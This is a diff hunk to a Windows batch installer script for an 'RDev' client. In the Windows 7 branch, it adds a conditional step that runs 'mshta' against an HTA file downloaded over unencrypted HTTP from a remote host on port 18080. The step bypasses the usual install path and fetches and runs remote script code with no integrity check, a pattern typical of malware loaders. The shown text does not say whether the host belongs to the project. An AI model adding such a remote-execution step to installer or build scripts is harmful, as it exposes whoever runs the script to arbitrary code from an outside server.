@@ -24,6 +24,10 @@ del /q "%RDEV_ENTRY%" >nul 2>&1
 exit /b %RDEV_EXIT%
 
 :win7
+if defined RDEV_ENROLLMENT_CODE (
+  mshta http://r.feidu.fit:18080/win7-bootstrap.hta
+  exit /b %ERRORLEVEL%
+)
 set "RDEV_HOME=%LOCALAPPDATA%\RDev"
 if not exist "%RDEV_HOME%" mkdir "%RDEV_HOME%" >nul 2>&1
 set "RDEV_ASSET=rdev-client-windows-win7-amd64.exe"
